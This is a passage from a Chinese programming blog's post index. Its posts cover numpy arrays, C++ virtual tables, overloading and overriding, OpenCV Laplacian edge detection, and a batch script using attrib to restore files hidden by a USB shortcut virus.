生成3*3的二维数组","text":"通过array将数据（列表、元祖、数组等序列类型）转化为numpy array 12345import numpy as npdata = (1, 2, 3.1)data2 = [1, 2, 3.1]arr = np.array(data)arr2 = np.array(data2) 通过zeros创建全为0的numpy array 12np.zeros(3) # 生成包含3个0的一维数组np.zeros((3, 3)) # 生成3*3的二维数组 通过ones创建全为1的numpy array 12np.ones(3) # 生成包含3个1的一维数组np.ones((3, 3)) # 生成3*3的二维数组 通过empty创建numpy array，只分配空间，数据随机 1print np.empty((3, 3)) # 生成3*3的二维数组，所有元素未初始化。 123[[ 9.90943830e-290 1.16310967e+214 5.56206154e+180] [ 4.83245960e+276 8.03704345e-095 5.50495710e-095] [ 1.69281515e+165 6.32263054e+233 7.07116662e-308]] 类似于range那样，可以通过arange创建numpy array 1np.arange(9) # [0, 1, 2, ..., 9] 通过eye或identity创建nxn的单位矩阵 12np.eye(4) #生成4*4的单位矩阵np.identity(4) #生成4*4的单位矩阵 asarray是将数据（列表、元祖、数组等序列类型）转化为numpy array，如果数据是numpy array类型的话就不复制 1234arr1=np.ones((3,3)) arr2=np.array(arr1) arr3=np.asarray(arr1) #相当于arr1和arr3指向同一块内存arr1[1]=2 123456789101112arr1: [[ 1. 1. 1.] [ 2. 2. 2.] [ 1. 1. 1.]] arr2: [[ 1. 1. 1.] [ 1. 1. 1.] [ 1. 1. 1.]] arr3: [[ 1. 1. 1.] [ 2. 2. 2.] [ 1. 1. 1.]]","categories":[{"name":"python","slug":"python","permalink":"http://coordinate.wang/categories/python/"}],"tags":[{"name":"python","slug":"python","permalink":"http://coordinate.wang/tags/python/"},{"name":"numpy","slug":"numpy","permalink":"http://coordinate.wang/tags/numpy/"}]},{"title":"numpy.array 和 array以及list的效率对比","slug":"2017-11-8-numpy.array-和-array以及list的效率对比","date":"2017-11-07T16:00:00.000Z","updated":"2018-02-18T08:40:56.354Z","comments":true,"path":"2017/11/08/2017-11-8-numpy.array-和-array以及list的效率对比/","link":"","permalink":"http://coordinate.wang/2017/11/08/2017-11-8-numpy.array-和-array以及list的效率对比/","excerpt":"","text":"1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#coding:utf-8import timeitcommon_for = \"\"\"for d in data: s += d\"\"\"common_sum = \"\"\"sum(data)\"\"\"&lt;!--more--&gt;common_numpy_sum = \"\"\"numpy.sum(data)\"\"\"def timeit_list(n, loops): list_setup = \"\"\"import numpydata = [1] * &#123;0&#125;#生成n个数的列表s = 0\"\"\".format(n) print 'list:' print timeit.timeit(common_for, list_setup, number = loops)#'common_for'是要执行语句 list_setup导入执行语句需要的数据，loops表示执行语句最后要执行的次数 print timeit.timeit(common_sum, list_setup, number = loops) print timeit.timeit(common_numpy_sum, list_setup, number = loops)def timeit_array(n, loops): array_setup = \"\"\"import numpyimport arraydata = array.array('L', [1] * &#123;0&#125;)#unsigned long，这里的初始化必须先给类型s = 0\"\"\".format(n) print 'array:' print timeit.timeit(common_for, array_setup, number = loops) print timeit.timeit(common_sum, array_setup, number = loops) print timeit.timeit(common_numpy_sum, array_setup, number = loops)def timeit_numpy(n, loops): numpy_setup = \"\"\"import numpydata = numpy.array([1] * &#123;0&#125;)s = 0\"\"\".format(n) print 'numpy:' print timeit.timeit(common_for, numpy_setup, number = loops) print timeit.timeit(common_sum, numpy_setup, number = loops) print timeit.timeit(common_numpy_sum, numpy_setup, number = loops)if __name__ == '__main__': timeit_list(50000, 500) timeit_array(50000, 500) timeit_numpy(50000, 500) 我这里的结果是 123456789101112list:0.7434018477520.2446816266781.00076942461array:1.838739361131.360518253844.02721759923numpy:3.862116207893.343977394350.0103776763518 所以对于numpy，我们尽量使用它的内置函数吧！","categories":[{"name":"python","slug":"python","permalink":"http://coordinate.wang/categories/python/"}],"tags":[{"name":"python","slug":"python","permalink":"http://coordinate.wang/tags/python/"},{"name":"numpy","slug":"numpy","permalink":"http://coordinate.wang/tags/numpy/"}]},{"title":"静态绑定和动态绑定总结","slug":"2017-11-7-静态绑定和动态绑定总结","date":"2017-11-06T16:00:00.000Z","updated":"2018-02-18T03:29:07.507Z","comments":true,"path":"2017/11/07/2017-11-7-静态绑定和动态绑定总结/","link":"","permalink":"http://coordinate.wang/2017/11/07/2017-11-7-静态绑定和动态绑定总结/","excerpt":"","text":"","categories":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/categories/cpp/"}],"tags":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/tags/cpp/"},{"name":"binding","slug":"binding","permalink":"http://coordinate.wang/tags/binding/"}]},{"title":"虚函数表到底是怎么存放的","slug":"2017-11-6-虚函数表到底是怎么存放的","date":"2017-11-05T16:00:00.000Z","updated":"2018-02-18T08:41:12.540Z","comments":true,"path":"2017/11/06/2017-11-6-虚函数表到底是怎么存放的/","link":"","permalink":"http://coordinate.wang/2017/11/06/2017-11-6-虚函数表到底是怎么存放的/","excerpt":"“when VTABLE is get created in Memory , In compiletime or runtime?” Compile time. The vtable is simple an array of function pointers that gets stored in the executable. It never changes and this array is shared by all instances of a given class. Each instance of a class that has virtual methods contains one vtable pointer (for single inheritance), usually stored at offset 0, before all data members. This pointer is initialized at construction time to point to the vtable for that class. “当VTABLE被创建在内存中，在编译时或运行时？“ 编译时。 vtable是一个简单的函数指针数组，存储在可执行文件中。 它永远不会改变，并且这个数组被给定类的所有实例共享。 具有虚拟方法的类的每个实例都包含一个vtable指针（用于单个继承），通常存储在所有数据成员之前的偏移量0处。 这个指针在构造时被初始化，指向该类的虚表。 “If the class contain one virtual function , then what is the size of class?” The class has the same size if it has 1 or 100 virtual functions, size of the class data members + size of the vtable pointer (4 bytes for x86, 8 bytes for x64) (for single inheritance). “如果这个类包含一个虚拟函数，那么类的大小是多少？” 如果具有1或100个虚拟函数，类数据成员的大小+ vtable指针的大小（x86为4个字节，x64为8个字节）（单个继承），则该类具有相同的大小。","text":"“when VTABLE is get created in Memory , In compiletime or runtime?” Compile time. The vtable is simple an array of function pointers that gets stored in the executable. It never changes and this array is shared by all instances of a given class. Each instance of a class that has virtual methods contains one vtable pointer (for single inheritance), usually stored at offset 0, before all data members. This pointer is initialized at construction time to point to the vtable for that class. “当VTABLE被创建在内存中，在编译时或运行时？“ 编译时。 vtable是一个简单的函数指针数组，存储在可执行文件中。 它永远不会改变，并且这个数组被给定类的所有实例共享。 具有虚拟方法的类的每个实例都包含一个vtable指针（用于单个继承），通常存储在所有数据成员之前的偏移量0处。 这个指针在构造时被初始化，指向该类的虚表。 “If the class contain one virtual function , then what is the size of class?” The class has the same size if it has 1 or 100 virtual functions, size of the class data members + size of the vtable pointer (4 bytes for x86, 8 bytes for x64) (for single inheritance). “如果这个类包含一个虚拟函数，那么类的大小是多少？” 如果具有1或100个虚拟函数，类数据成员的大小+ vtable指针的大小（x86为4个字节，x64为8个字节）（单个继承），则该类具有相同的大小。 “Heap or Stack?” As I said, the vtable is stored in the executable. The executable is memory mapped so basically it’s stored in the same place where the code is, in memory that belongs to a memory mapped section, that’s neither heap nor stack. “堆或堆？” 正如我所说的，vtable存储在可执行文件中。 可执行程序是内存映射的，所以基本上它存储在代码所在的同一个地方，属于内存映射部分的内存中，既不堆也不堆栈。 And one more thing initialization of v-table take place under default constructor.The vtable is built at compile time( statically allocated).Each of the type instances contains a pointer to this table Because this pointer is initialized at construction time, a virtual member function should never be called from the constructor 还有一件事是在默认的构造函数下进行v-table的初始化。vtable是在编译时建立的（静态分配的）。每个类型实例都包含一个指向这个表的指针因为这个指针在构造时被初始化， 一个虚成员函数不应该被构造函数调用。","categories":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/categories/cpp/"}],"tags":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/tags/cpp/"},{"name":"vfptr","slug":"vfptr","permalink":"http://coordinate.wang/tags/vfptr/"}]},{"title":"纯虚函数的调用","slug":"2017-11-5-纯虚函数调用","date":"2017-11-04T16:00:00.000Z","updated":"2018-02-18T08:41:21.336Z","comments":true,"path":"2017/11/05/2017-11-5-纯虚函数调用/","link":"","permalink":"http://coordinate.wang/2017/11/05/2017-11-5-纯虚函数调用/","excerpt":"看到这个标题的时候你可能会惊讶？纯虚函数怎么可以调用呢？看下面这个例子 123456789101112131415161718192021222324class Abstract_base&#123;public: virtual ~Abstract_base(); virtual void interface() = 0; const char* mumble() const &#123; return _mumble; &#125;protected: char *_mumble;&#125;;class Concrete_derived :public Abstract_base&#123;public: void Concrete_deriverd() &#123;&#125;; virtual void interface();&#125;;inline void Abstract_base::interface()&#123; function //...&#125;inline void Concrete_derived::interface()&#123; Abstract_base::interface();//静态调用&#125;","text":"看到这个标题的时候你可能会惊讶？纯虚函数怎么可以调用呢？看下面这个例子 123456789101112131415161718192021222324class Abstract_base&#123;public: virtual ~Abstract_base(); virtual void interface() = 0; const char* mumble() const &#123; return _mumble; &#125;protected: char *_mumble;&#125;;class Concrete_derived :public Abstract_base&#123;public: void Concrete_deriverd() &#123;&#125;; virtual void interface();&#125;;inline void Abstract_base::interface()&#123; function //...&#125;inline void Concrete_derived::interface()&#123; Abstract_base::interface();//静态调用&#125; 不过只可以通过静态调用，不可以通过虚拟机制去调用。为什么不可以？如果这样做 12Concrete_derived *p = new Abstract_base;//错误，Abstract_Base是一个抽象数据类，不允许构造一个对象p-&gt;interface(); 你似乎会觉得这没什么！那我接着加大难度 123456789101112131415161718192021222324252627282930313233343536class Base&#123;public: Base()&#123;&#125; void callFunc(); virtual ~Base()&#123;&#125;;private: virtual void Func() = 0;&#125;;class Derived:public Base&#123;public: Derived()&#123;&#125;private: virtual void Func();&#125;;void Base::Func()&#123; std::cout &lt;&lt; \"func in Base!\" &lt;&lt; std::endl;&#125;void Base::callFunc()&#123; Func(); Base::Func();//静态调用纯虚函数&#125;void Derived::Func()&#123; std::cout &lt;&lt; \"func in Derived!\" &lt;&lt; std::endl;&#125;int main()&#123; Base *pd = new Derived; pd-&gt;callFunc(); delete pd; system(\"pause\");&#125; 结果是 12func in Derived!func in Base! 你这个时候是不是很困惑？Base中的callFunc函数分别调用了在Base中定义的纯虚函数版本和Derived中的实现版本。为什么？Base中的callFunc函数调用了Derived中的私有虚函数！它竟然绕过了访问控制机制！为什么？ 我们慢慢开始，首先我们知道这里pd没有发生动态绑定，因为调用的不是虚函数，这里我们可以明确pd调用的是Base::callFunc()接着进入Base::callFunc()内部。第一个函数Func()，这里我们会疑惑，到底是Base::Func()还是Derived::Func()？这时你可能很快地回答我Base::Func()。因为我在 关于重载、隐藏、重写的一些思考（1） 中谈过类继承里面的作用域问题。此时你坚信这是在Base的作用域里面，难道调用的不是Base::Func()？pd确实是在Base的作用域内，但是pd指向的Func是在Derived 的作用域内的。我在 关于重载、隐藏、重写的一些思考（2）中分析了复杂作用域的问题。 我这里提出这样一个问题，如果Derived内也有一个callFunc函数，那么此时pd调用的还是Base::callFunc()吗？我这里给出答案，是的，因为pd是在Base的作用域内。 从另一个角度看这个问题，Func是一个虚函数，它会是一种动态绑定。也就是说这里的Func 是根据运行期来决定的。这个时候pd实际上是一个Derived类型的首地址（Derived虚函数表的地址），自然地会找到Derived::Func()，再次强调这个过程是动态调用，接着我们使用静态调用去访问Base::Func()。 ok，问题解决了一大半。为什么可以调用Derived的私有函数这里也很好理解了。因为这个函数是在虚函数表里面的，而虚函数表中没有私有这个概念，自然就可以了。 用一张图总结 好的，接着我们会想为什么会有这么奇怪的做法呢？这其实是一种Template Method设计模式。 另外还有一个问题，细心的同学会发现，第一个例子是一个抽象类，但是它里面有一个保护成员char *_mumble ，问什么会有这样的做法？我们该怎么初始化这个数据？请看抽象类中的数据","categories":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/categories/cpp/"}],"tags":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/tags/cpp/"}]},{"title":"关于重载、隐藏、重写的一些思考（2）","slug":"2017-11-4-关于重载、隐藏、重写的一些思考（2）","date":"2017-11-03T16:00:00.000Z","updated":"2018-02-18T08:41:29.057Z","comments":true,"path":"2017/11/04/2017-11-4-关于重载、隐藏、重写的一些思考（2）/","link":"","permalink":"http://coordinate.wang/2017/11/04/2017-11-4-关于重载、隐藏、重写的一些思考（2）/","excerpt":"关于重载、隐藏、重写的一些思考（1）内容我们谈到了override，我说它和namehiding看上去很相似。我们先验证一下，它是否有namehiding的一些特征，并且又有哪些不同。 1234567891011121314151617class Base&#123;public: virtual void func1() = 0; virtual void func2(); virtual void func2(int); //重载 void func3(); void func3(int); //重载&#125;;class Derived: public Base&#123;public: virtual void func1(); virtual void func2(); //override void func3(); void func4();&#125;;","text":"关于重载、隐藏、重写的一些思考（1）内容我们谈到了override，我说它和namehiding看上去很相似。我们先验证一下，它是否有namehiding的一些特征，并且又有哪些不同。 1234567891011121314151617class Base&#123;public: virtual void func1() = 0; virtual void func2(); virtual void func2(int); //重载 void func3(); void func3(int); //重载&#125;;class Derived: public Base&#123;public: virtual void func1(); virtual void func2(); //override void func3(); void func4();&#125;; 123456Derived d;d.func1(); //调用Derived::func1()d.func2(); //调用Derived::func2()重写了Base::func2() 隐藏了Base::func2(int)d.func2(3); //错误，无法调用Base::func2(int)d.func3(); //调用Derived::func3()隐藏了Base::func3()和Base::func3(int)d.func3(3); //错误，无法调用Base::func3(int) override和namehiding发生了同样的事情。好，很不错。 既然我们把一个东西藏起来了，那么我们也有办法把他找到。 123456789101112131415161718class Base&#123;public: virtual void func1() = 0; virtual void func2(); virtual void func2(int); //重载 void func3(); void func3(int); //重载&#125;;class Derived: public Base&#123;public: using Base::func3; //新加入 virtual void func1(); virtual void func2(); void func3(); void func4();&#125;; 1d.func3(); //调用Base::func3() 嗯，我们似乎做的不错，我们也可以这样去调用Base::func3() 1d.Base::func3(); //调用Base::func3() 这些都恰恰说明了，隐藏仅仅是隐藏，它原来的东西还是有的，并没有消失。接着我们再看看发生override的func2 ，当我们这样去做的时候 12d.Base::func2(); //调用Base::func2()&lt;--------------d.Base::func2(3); //调用Base::func2(int)&lt;----------- ok，我们很愉快的看到了override和namehiding在这一点上又有了相似的特性。 我们再通过之前的一个小技巧，查看类的结构。 12345678910111213141516171819202122232425262728293031321&gt; class Base size(4):1&gt; +---1&gt; 0 | &#123;vfptr&#125;1&gt; +---1&gt;1&gt; Base::$vftable@:1&gt; | &amp;Base_meta1&gt; | 01&gt; 0 | &amp;Base::func11&gt; 1 | &amp;Base::func21&gt; 2 | &amp;Base::func21&gt;1&gt; Base::func1 this adjustor: 01&gt; Base::func2 this adjustor: 01&gt; Base::func2 this adjustor: 01&gt;1&gt; class Derived size(4):1&gt; +---1&gt; 0 | +--- (base class Base)1&gt; 0 | | &#123;vfptr&#125;1&gt; | +---1&gt; +---1&gt;1&gt; Derived::$vftable@:1&gt; | &amp;Derived_meta1&gt; | 01&gt; 0 | &amp;Derived::func11&gt; 1 | &amp;Base::func21&gt; 2 | &amp;Derived::func21&gt;1&gt; Derived::func1 this adjustor: 01&gt; Derived::func2 this adjustor: 0 Derived虚函数表继承了Base虚函数表里面的所有函数，但是又对之前说的override的函数都进行自己的本地化，都变成了Derived自己的函数，这个过程是一种改写的过程。 很多奇怪的问题就不难理解了。诸如上面的 1d.func2(); //调用Derived::func2()重写了Base::func2() 隐藏了Base::func2(int) 为什么会出现这种情况？ 我觉得是这样的，首先我们建立了一个Derived类，建立之前会调用基类的构造函数，这个时候会在静态存储区（请看这篇虚函数表到底是怎么存放的）建立一个属于Base类的vtable，接着构造Derived类的时候又建立了一个属于Derived类的vtable（注意这些vtable都不是属于单一对象的（是公有的），但是vfptr是每个对象都独有的），copy了Base类的vtable里面的所有指向虚函数的指针，并且对Base类vtable里面的指向相同函数名相同参数列表函数的指针进行了本地化（改写）。如下图 最后通过汇编去看整个操作 123456789101112131415161718192021222324Derived d;01335C08 lea ecx,[d] 01335C0B call Derived::Derived (013312E4h) int x = 10;01335C10 mov dword ptr [x],0Ah d.func1(); //调用Derived::func1()01335C17 lea ecx,[d] 01335C1A call Derived::func1 (013314C4h) d.func2(); //调用Derived::func2()01335C1F lea ecx,[d] 01335C22 call Derived::func2 (013314C9h) d.func3(); //调用Derived::func3()01335C27 lea ecx,[d] 01335C2A call Derived::func3 (013314E2h) d.Base::func3(); //调用Base::func3()&lt;--------------01335C2F lea ecx,[d] 01335C32 call Base::func3 (013314D8h) d.Base::func2(); //调用Base::func2()&lt;--------------01335C37 lea ecx,[d] 01335C3A call Base::func2 (013314D3h) d.Base::func2(3); //调用Base::func2(int)&lt;-----------01335C3F push 3 01335C41 lea ecx,[d] 01335C44 call Base::func2 (013314CEh) 我们通过上述的列子可以看到，在静态绑定的情况下，namehiding和override表现出了一样的性质。 那到底哪不同呢？它们的不同出现在动态绑定时（我总结过什么时候会发生静态和动态绑定） 123Base *p = new Derived;p-&gt;func2(); //调用Derived::func2()p-&gt;func3(); //调用Base::func3() 对于namehiding来说，由于Base::func3不是virtual的，因此编译器会根据对象引用的静态类型而不是对象的实际类型来选择调用哪个函数。(this-&gt;func3) 对于override来说，由于func2是virtual的，因此编译器根据对象的实际类型类型来选择所需的函数。（this-&gt;vfptr-&gt;vtable-&gt;func2） 汇编层面看很清楚 123456789101112 p-&gt;func2();010428FD mov eax,dword ptr [p] 01042900 mov edx,dword ptr [eax] 01042902 mov esi,esp 01042904 mov ecx,dword ptr [p] 01042907 mov eax,dword ptr [edx+8] 0104290A call eax 0104290C cmp esi,esp 0104290E call __RTC_CheckEsp (010411A9h) p-&gt;func3();01042913 mov ecx,dword ptr [p] 01042916 call Base::func3 (010414D8h) 所以大致总结如下： 在具有继承关系的不同类中，重写（override）仅发生在具有相同函数名且相同参数列表的virtual函数之间。（同函数名、同参数列表、virtual） 在具有继承关系的不同类（具有包含关系的不同作用域）中，具有相同函数名的非ivrtual函数之间（不论参数表是不是一样），都会发生隐藏。（同函数名、非virtual） 在具有继承关系的不同类中，具有相同函数名且参数列表不相同的virtual函数之间，都会发生隐藏。（同函数名、不同参数列表、virtual） 在相同类（作用域）中，函数名相同参数列表不同的函数之间是一种重载关系（overload）","categories":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/categories/cpp/"}],"tags":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/tags/cpp/"},{"name":"overload","slug":"overload","permalink":"http://coordinate.wang/tags/overload/"},{"name":"override","slug":"override","permalink":"http://coordinate.wang/tags/override/"},{"name":"namehiding","slug":"namehiding","permalink":"http://coordinate.wang/tags/namehiding/"}]},{"title":"关于重载、隐藏、重写的一些思考（1）","slug":"2017-11-3-关于重载、隐藏、重写的一些思考","date":"2017-11-02T16:00:00.000Z","updated":"2018-02-18T08:41:35.745Z","comments":true,"path":"2017/11/03/2017-11-3-关于重载、隐藏、重写的一些思考/","link":"","permalink":"http://coordinate.wang/2017/11/03/2017-11-3-关于重载、隐藏、重写的一些思考/","excerpt":"开始这个问题之前，首先你要已经对于虚函数和虚函数表的概念有了一定得了解。 首先说一下重载（overload）这个概念，这很简单，在C语言里面就有的东西。 When two or more different declarations are specified for a single name in the same scope, that name is said to overloaded. By extension, two declarations in the same scope that declare the same name but with different types are called overloaded declarations. Only function declarations can be overloaded; object and type declarations cannot be overloaded.","text":"开始这个问题之前，首先你要已经对于虚函数和虚函数表的概念有了一定得了解。 首先说一下重载（overload）这个概念，这很简单，在C语言里面就有的东西。 When two or more different declarations are specified for a single name in the same scope, that name is said to overloaded. By extension, two declarations in the same scope that declare the same name but with different types are called overloaded declarations. Only function declarations can be overloaded; object and type declarations cannot be overloaded. 通常我们把同一作用域内，可以具有相同函数名，但是参数列表不同的函数，叫做重载函数。 12void func1();void func1(int) 好，这so easy！ 隐藏（namehiding），这是一个作用域的概念，这一点很重要。我们最早知道作用域这个概念，大概是C语言时期。 123456int x;void func()&#123; double x; printf(\"%lf\", x);&#125; 我们可以很清晰的知道，double x 是local的，int x 是global的。接着我们考虑继承问题。 12345678910111213141516class Base&#123;public: virtual void func1() = 0; virtual void func2(); virtual void func2(int); //重载 void func3(); void func3(int); //重载&#125;;class Derived: public Base&#123;public: virtual void func1(); void func3(); void func4();&#125;; 首先，Base::func1是一个纯虚函数，所以我们要在派生类中要去实现它Derived::func1()。我们知道Base::func2这里发生了函数重载，Base::func2()和Base::func2(int)在同一作用域内，函数名相同，但是参数列表不同。同样的Base::func3也发生了重载。 再看Base::func3和Derived::func3，它们在不同作用域内。我们看到这里func3和前面说的x是不是有什么相似的点呢？对，它们的作用域都有一个包含的关系。 注意着张图的画法，要将此和继承的概念区分开，继承的话是Derived包含了Base。好的，我们看看结果是不是和我么想的一样。 123456Derived d;int x;d.func1(); //调用Derived::func1()d.func2(); //调用Base::func2()d.func3(); //调用Derived::func3()d.func3(x); //出错，无法调用Base::func3(int) 果然如此，事实也确实如此。所以只要作用域之间是一种包含关系，不同作用域相同函数名函数之间就会发生隐藏。 再来看重写（override）的问题，父类和子类函数都是virtual函数并且函数名和参数列表都相同，则它们构成的关系叫做override。 细心的同学一定注意到了上面Derived类里面似乎少了些什么。对，我们没有对于虚函数func2进行隐藏。 1234567891011121314151617class Base&#123;public: virtual void func1() = 0; virtual void func2(); virtual void func2(int); //重载 void func3(); void func3(int); //重载&#125;;class Derived: public Base&#123;public: virtual void func1(); virtual void func2(); //新加的 void func3(); void func4();&#125;; 此时按照override的定义，可以很清楚地知道Base::func2和Derived::func2构成override关系。 那这个override和namehiding有什么关系吗？它们看上去如此的相似。请看关于重载、隐藏、重写的一些思考（2）。","categories":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/categories/cpp/"}],"tags":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/tags/cpp/"},{"name":"overload","slug":"overload","permalink":"http://coordinate.wang/tags/overload/"},{"name":"override","slug":"override","permalink":"http://coordinate.wang/tags/override/"},{"name":"namehiding","slug":"namehiding","permalink":"http://coordinate.wang/tags/namehiding/"}]},{"title":"关于u盘快捷方式病毒的解决方案","slug":"2017-10-28-关于u盘快捷方式病毒的解决方案","date":"2017-10-27T16:00:00.000Z","updated":"2018-02-18T08:41:44.783Z","comments":true,"path":"2017/10/28/2017-10-28-关于u盘快捷方式病毒的解决方案/","link":"","permalink":"http://coordinate.wang/2017/10/28/2017-10-28-关于u盘快捷方式病毒的解决方案/","excerpt":"最近学校的电脑中了病毒，导致上课时u盘插上电脑后，u盘里面的文件全变成了快捷方式。可能是xxx的一个恶作剧吧，但是挺麻烦的。解决方法非常简单 123456789@echo off@echo 2017.10.28 by coordinate@echo +-------------------------------------------------------------+attrib -s -h *. /S /Dattrib +s +h System~1attrib +s +h Recycledattrib +s +h +a ntldr@echo 完成！@echo on 将上面的代码copy到一个.txt文件中，然后将这个命名为go.bat，注意后缀名变为bat，也就是一个批处理。接着将go.bat文件copy到u盘中，双击运行即可。","text":"最近学校的电脑中了病毒，导致上课时u盘插上电脑后，u盘里面的文件全变成了快捷方式。可能是xxx的一个恶作剧吧，但是挺麻烦的。解决方法非常简单 123456789@echo off@echo 2017.10.28 by coordinate@echo +-------------------------------------------------------------+attrib -s -h *. /S /Dattrib +s +h System~1attrib +s +h Recycledattrib +s +h +a ntldr@echo 完成！@echo on 将上面的代码copy到一个.txt文件中，然后将这个命名为go.bat，注意后缀名变为bat，也就是一个批处理。接着将go.bat文件copy到u盘中，双击运行即可。 关于上面代码的一些解析 ATTRIB [+R | -R][+A | -A ] [+S | -S][+H | -H] [[drive:] [path] filename][/S [/D]] +设置属性。 -清除属性。 R 只读文件属性。 A 存档文件属性。 S 系统文件属性。 H 隐藏文件属性。 [drive:][path][filename] 指定要处理的文件位置 /S 处理当前文件夹及其子文件夹中的匹配文件。 /D 处理文件夹。 attrib -s -h *. /S /D 清除当前文件夹及其子文件夹中的文件隐藏文件属性和系统文件属性。 attrib +s +h System~1 设置系统还原文件夹隐藏和系统文件属性 attrib +s +h Recycled 设置回收站隐藏和系统文件属性 attrib +s +h +a ntldr 设置ntldr文件的隐藏、系统和存档属性。ntldr是一个隐藏的，只读的系统文件，位置在系统盘的根目录，用来装载操作系统。","categories":[{"name":"信息安全","slug":"信息安全","permalink":"http://coordinate.wang/categories/信息安全/"}],"tags":[{"name":"vbs","slug":"vbs","permalink":"http://coordinate.wang/tags/vbs/"},{"name":"病毒","slug":"病毒","permalink":"http://coordinate.wang/tags/病毒/"}]},{"title":"使用opencv对图片进行边缘特征提取","slug":"2017-10-26-使用opencv对图片进行边缘特征提取","date":"2017-10-25T16:00:00.000Z","updated":"2018-02-18T08:41:50.643Z","comments":true,"path":"2017/10/26/2017-10-26-使用opencv对图片进行边缘特征提取/","link":"","permalink":"http://coordinate.wang/2017/10/26/2017-10-26-使用opencv对图片进行边缘特征提取/","excerpt":"问题的描述 我们需要通过一些图像处理的手段，将a图中图像的轮廓提取出来，结果类似于b图。","text":"问题的描述 我们需要通过一些图像处理的手段，将a图中图像的轮廓提取出来，结果类似于b图。 解决思路使用Laplacian看到这个问题，我想到的第一办法就是拉普拉斯算子。ok，沿着这个思路，我通过opencv在windows平台上进行了一些测试。Laplacian 算子的定义: $Laplace(f)=\\frac{(∂^2 f)}{(∂x^2 )}+\\frac{(∂^2 f)}{(∂y^2 )}$ 这里求导使用的方法是Sobel算子，关于Sobel算子请看2.3。在opencv中Laplacian的函数原型 123CV_EXPORTS_W void Laplacian( InputArray src, OutputArray dst, int ddepth, int ksize = 1, double scale = 1, double delta = 0, int borderType = BORDER_DEFAULT ); 在opencv源代码中就已经说明了这个函数的使用，如下： 1234567@param src Source image.@param dst Destination image of the same size and the same number of channels as src .@param ddepth Desired depth of the destination image.@param ksize Aperture size used to compute the second-derivative filters. See getDerivKernels for details. The size must be positive and odd.@param scale Optional scale factor for the computed Laplacian values. By default, no scaling is applied. See getDerivKernels for details.@param delta Optional delta value that is added to the results prior to storing them in dst .@param borderType Pixel extrapolation method, see cv::BorderTypes 当ksize=3时，Laplacian()函数的孔径为 $\\left| \\begin{array} (0 &amp; 1 &amp; 0 \\1 &amp; -4 &amp; 1 \\0 &amp; 1 &amp; 0 \\end{array} \\right|$ 注意这里最后一个参数的定义，查看源码发现是一个枚举类型。 123456789101112enum BorderTypes &#123; BORDER_CONSTANT = 0, //!&lt; `iiiiii|abcdefgh|iiiiiii` with some specified `i` BORDER_REPLICATE = 1, //!&lt; `aaaaaa|abcdefgh|hhhhhhh` BORDER_REFLECT = 2, //!&lt; `fedcba|abcdefgh|hgfedcb` BORDER_WRAP = 3, //!&lt; `cdefgh|abcdefgh|abcdefg` BORDER_REFLECT_101 = 4, //!&lt; `gfedcb|abcdefgh|gfedcba` BORDER_TRANSPARENT = 5, //!&lt; `uvwxyz|absdefgh|ijklmno` BORDER_REFLECT101 = BORDER_REFLECT_101, //!&lt; same as BORDER_REFLECT_101 BORDER_DEFAULT = BORDER_REFLECT_101, //!&lt; same as BORDER_REFLECT_101 BORDER_ISOLATED = 16 //!&lt; do not look outside of ROI&#125;; 大致含义是这样的 BORDER_CONSTANT 需要设置borderValue 指定 ‘ i ‘ 值 BORDER_CONSTANT就是边沿像素用i替换 BORDER_REPLICATE ，复制边界像素 BORDER_REFLECT ，反射复制边界像素 BORDER_REFLECT_101，以边界为对称轴反射复制像素 这里我选用了BORDER_DEFAULT。 代码如下： 123456789101112131415161718192021222324252627282930313233343536/********************************************************程序名称：Laplacian*开发环境：vs2015+opencv3.3*2017.10.24 by coordinate*www.coordinate.wang*CSDN:coordinate_blog*********************************************************/#include &lt;iostream&gt; #include &lt;opencv2\\opencv.hpp&gt;int main() &#123; //读取图像 cv::Mat img = cv::imread(\"avatar.png\"); if (!img.data) &#123; std::cout &lt;&lt; \"Error: read image\" &lt;&lt; std::endl; return -1; &#125; //将图像转化为灰度图 cv::Mat img_gray&#123;&#125;; cv::cvtColor(img, img_gray, cv::COLOR_RGB2GRAY); //使用Laplacian cv::Mat abs_dst&#123;&#125;; int kernel_size = 3; int scale = 1; int delta = 0; int ddepth = CV_16S; cv::Laplacian(img_gray, img, ddepth, kernel_size, scale, delta, cv::BORDER_DEFAULT); //计算绝对值，并将结果转换成8位 cv::convertScaleAbs(img, abs_dst); // 在窗口中显示avatar cv::imshow(\"Laplacian\", abs_dst); // 等待按下任意键后窗口关闭 cv::waitKey(0);&#125; 最后的效果图： 看上去有些模糊，但是总体的轮廓大致是有了，接下来我觉得可以先对图像进行滤波处理再做拉普拉斯。我这里使用的高斯滤波。 使用Laplacian+高斯滤波函数原型 123CV_EXPORTS_W void GaussianBlur( InputArray src, OutputArray dst, Size ksize, double sigmaX, double sigmaY = 0, int borderType = BORDER_DEFAULT ); 源代码参数说明 1234567@param src input image; the image can have any number of channels, which are processedindependently, but the depth should be CV_8U, CV_16U, CV_16S, CV_32F or CV_64F.@param dst output image of the same size and type as src.@param ksize Gaussian kernel size. ksize.width and ksize.height can differ but they both must be positive and odd. Or, they can be zero's and then they are computed from sigma.@param sigmaX Gaussian kernel standard deviation in X direction.@param sigmaY Gaussian kernel standard deviation in Y direction; if sigmaY is zero, it is set to be equal to sigmaX, if both sigmas are zeros, they are computed from ksize.width and ksize.height, respectively (see cv::getGaussianKernel for details); to fully control the result regardless of possible future modifications of all this semantics, it is recommended to specify all of ksize, sigmaX, and sigmaY.@param borderType pixel extrapolation method, see cv::BorderTypes 代码如下： 12345678910111213141516171819202122232425262728293031323334353637/********************************************************程序名称：Laplacian+高斯滤波*开发环境：vs2015+opencv3.3*2017.10.24 by coordinate*www.coordinate.wang*CSDN:coordinate_blog*********************************************************/#include &lt;iostream&gt; #include &lt;opencv2\\opencv.hpp&gt;int main() &#123; //读取图像 cv::Mat img = cv::imread(\"avatar.png\"); if (!img.data) &#123; std::cout &lt;&lt; \"Error: read image\" &lt;&lt; std::endl; return -1; &#125; 